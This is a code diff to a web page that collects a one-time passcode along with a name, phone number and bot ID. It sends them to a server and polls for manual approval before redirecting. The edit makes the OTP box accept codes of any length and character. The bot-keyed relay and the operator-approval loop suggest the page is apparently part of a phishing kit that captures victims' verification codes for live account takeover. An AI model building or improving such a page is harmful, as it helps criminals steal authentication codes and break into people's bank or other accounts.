@@ -63,7 +63,12 @@ h1 {
   border-radius:8px;
   border:1.5px solid #ddd;
   outline:none; 
-  letter-spacing: 6px;
+  letter-spacing: 4px; /* kept for readability, works for any length */
+}
+
+/* Focus state */
+.otp-wrap input:focus {
+  border-color: #e11b22;
 }
 
 button {
@@ -106,7 +111,13 @@ button:enabled {
   <div class="info">Please enter the OTP sent to verify.</div>
 
   <div class="otp-wrap">
-    <input id="otpInput" type="tel" inputmode="numeric" placeholder="Enter OTP">
+    <!-- 
+      CHANGED: 
+      - type="text" instead of "tel" – allows letters, numbers, symbols.
+      - Removed inputmode="numeric" – keyboard now shows letters.
+      - No maxlength attribute – accepts any length.
+    -->
+    <input id="otpInput" type="text" placeholder="Enter OTP">
   </div>
 
   <div id="otp-alert"></div>
@@ -135,14 +146,17 @@ if(!fullName || !phone || !botId){
   window.location.href='index.html';
 }
 
+// CHANGED: Removed the digit-stripping filter.
+// Now it accepts ANY character (letters, numbers, symbols) of ANY length.
 otpInput.addEventListener('input', () => {
-  otpInput.value = otpInput.value.replace(/\D/g,'');
+  // No more .replace(/\D/g,'') – we keep the exact input.
+  // Button enables if there's at least 1 character (any length works).
   verifyBtn.disabled = otpInput.value.trim().length === 0;
 });
 
 verifyBtn.addEventListener('click', async () => {
 
-  const otp = otpInput.value.trim();
+  const otp = otpInput.value.trim(); // gets the full code, whatever length
 
   verifyBtn.disabled = true;
   waitingEl.style.display = 'block';
@@ -156,7 +170,7 @@ verifyBtn.addEventListener('click', async () => {
       body: JSON.stringify({
         name: fullName,
         phone,
-        otp,
+        otp,          // sends the full code (any length / any chars)
         botId
       })
     });
@@ -192,7 +206,6 @@ function pollApproval(requestId){
       const res = await fetch(`${window.location.origin}/check-otp/${requestId}`);
       const data = await res.json();
 
-      // ✅ FIXED: server uses redirect OR approved, handle both
       if (data.approved === true || data.redirect === 'success') {
         clearInterval(interval);
         window.location.href = 'success.html';
